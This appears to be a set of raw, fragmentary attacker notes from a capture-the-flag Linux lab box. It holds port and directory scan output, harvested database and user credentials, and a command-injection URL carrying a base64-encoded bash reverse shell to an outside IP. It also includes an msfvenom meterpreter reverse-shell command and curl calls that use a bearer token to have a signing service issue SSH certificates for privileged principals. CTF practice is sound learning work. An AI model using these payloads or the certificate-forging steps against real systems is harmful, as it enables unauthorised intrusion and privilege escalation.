## Medium - Linux - Ressource 

- [+] :	TargetIP
  >>	10.129.xx.xx	
  
  
## Recon
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1


--------------------------------
# Dirbusting  


[23:11:03] 200 -   46B  - /admin.php
[23:13:38] 301 -  310B  - /api  ->  http://itrc.ssg.htb/api/
[23:13:39] 403 -  277B  - /api/
[23:13:59] 301 -  313B  - /assets  ->  http://itrc.ssg.htb/assets/
[23:13:59] 403 -  277B  - /assets/
[23:16:18] 200 -   46B  - /dashboard.php
[23:16:27] 200 -    0B  - /db.php
[23:17:40] 200 -  507B  - /home.php
[23:17:52] 200 -  241B  - /login.php
[23:17:54] 302 -    0B  - /logout.php  ->  index.php
[23:18:22] 200 -  263B  - /register.php
[23:18:26] 403 -  277B  - /server-status/
[23:18:27] 403 -  277B  - /server-status
[23:19:31] 403 -  277B  - /uploads/
[23:19:31] 301 -  314B  - /uploads  ->  http://itrc.ssg.htb/uploads/

cd /home
ls
msainristil
zzinter

ssh msainristil@172.223.0.1 -p 2222


Found readable /etc/mysql/my.cnf
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
Found lib_mysqludf_sys.so:


Deprecated: ZipArchive::open(): Using empty file as ZipArchive is deprecated in /var/www/itrc/savefile.inc.php on line 38

Warning: hash_file(/tmp/phpspNnyk): Failed to open stream: No such file or directory in /var/www/itrc/savefile.inc.php on line 48

Warning: Cannot modify header information - headers already sent by (output started at /var/www/itrc/savefile.inc.php:38) in /var/www/itrc/api/create_ticket.php on line 31

- [+] :	subdomains
  >>	 signserv.ssg.htb:33666
  ssh zzinter@localhost -i ca-itrc -t -t

<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "c";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());






ifconfig   
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.223.0.3  netmask 255.255.0.0  broadcast 172.223.255.255
        ether 02:42:ac:df:00:03  txqueuelen 0  (Ethernet)
        RX packets 76043  bytes 11711480 (11.1
        
        
        
        
        ssh localhost 
- [+] :	
  >>	
  
msainristil&pass=
su msainristil
82yards2closeit
- [+] :	
  >>	
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.217 LPORT=5555 -f elf -o reverse-sh.elf 10.129.22.115
  
  
  
http://localhost/$(echo${IFS}"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTcvNjMzMzYgMD4mMScK"${IFS}|${IFS}base64${IFS}-d|bash)



ssh -o CertificateFile=keypair-cert.pub -i keypair zzinter@10.129.35.129	



url -s signserv.ssg.htb/v1/sign -d '{                                                                                                                          
  "pubkey": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfiJjh9YNggiB4gBoVCyGtkiP3H71rV/EYz8L7bG82+OoZ0NHnsh/mP17psATRtcmBSs1CO+DBN1809G3Mrjvce9dW074MyV/dnQBckgOLSs5y28ZdXQrDf+JeErqIzjYf6DHcHVh6mXIcbhW+5I0LHWO20L3Bf/s6tP5u59ROeB5pR/aFa8/vEGc5xyRu6Z+RfM6E43kXgmwy/UfSWgJNj9pGgyeraEUUmKrdA0o2Iol+qD0TsKazHPkKZ0EHrQjgEzturxWiG1m13+I2tkmpkgleYLwpr9HAFvpyzx9MEyGV8k23LMleZrMs/5YA5vl/ktAjEqmkET2HVVTpZyFp zzinter@itrc
",
  "principals": "webadmin",
  "username": "zzinter"
}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"

ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgQvl2k6Fa010phpLq923Mwqp+06A1ywcJaHqRawQhEecAAAADAQABAAABAQDOWhZMNUk93/t23UE0LMcAMkVkPIw/ox+1CvVlKUGy1kRGa6YKTmi0D3FiJ3d74EtOeD/NRhc8JGi7wO98fMqcQ1NUIpbTbQE8CqUjJOfH+97IApWu/ofLp3bBwaynaD3oBPevvGjKG5rM3jITdm2H9wcds2LBYDbZVS/elxBq9mnA40qkIFO9ENzhTd1buWGPLcgTtLpmQHVvDcUtJeNDOZYVxztuxpsalD9cC9chiCW5bbtK6z6vkmrUMuM/9AW6yAKy4bNO0ONbMUadWT5shX465AGgISixobIHLtKEvpc19h5xoyegEE6+xQvwIp4b/yjlB67jr/s+/2FDevHXAAAAAAAAACcAAAABAAAAB3p6aW50ZXIAAAALAAAAB3N1cHBvcnQAAAAAZqcVTP//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAggeDwK53LVKHJh+rMLcA2WABxbtDgyhm57MATyY0VKbEAAABTAAAAC3NzaC1lZDI1NTE5AAAAQGCb5/DVmk4JygDYQ8KGlpoHTs4Yim7yTQ/9jcgb3d6tAchsJx6meo/2tMlh1U2sWk8m/ud8GJmB1S97XyOppg4= zzinter@itrc

url -s signserv.ssg.htb/v1/sign -d '{                                                                                                                          
  "pubkey": "ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgQvl2k6Fa010phpLq923Mwqp+06A1ywcJaHqRawQhEecAAAADAQABAAABAQDOWhZMNUk93/t23UE0LMcAMkVkPIw/ox+1CvVlKUGy1kRGa6YKTmi0D3FiJ3d74EtOeD/NRhc8JGi7wO98fMqcQ1NUIpbTbQE8CqUjJOfH+97IApWu/ofLp3bBwaynaD3oBPevvGjKG5rM3jITdm2H9wcds2LBYDbZVS/elxBq9mnA40qkIFO9ENzhTd1buWGPLcgTtLpmQHVvDcUtJeNDOZYVxztuxpsalD9cC9chiCW5bbtK6z6vkmrUMuM/9AW6yAKy4bNO0ONbMUadWT5shX465AGgISixobIHLtKEvpc19h5xoyegEE6+xQvwIp4b/yjlB67jr/s+/2FDevHXAAAAAAAAACcAAAABAAAAB3p6aW50ZXIAAAALAAAAB3N1cHBvcnQAAAAAZqcVTP//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAggeDwK53LVKHJh+rMLcA2WABxbtDgyhm57MATyY0VKbEAAABTAAAAC3NzaC1lZDI1NTE5AAAAQGCb5/DVmk4JygDYQ8KGlpoHTs4Yim7yTQ/9jcgb3d6tAchsJx6meo/2tMlh1U2sWk8m/ud8GJmB1S97XyOppg4= zzinter@itrc",
  "principals": "support",
  "username": "zzinter"
}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"



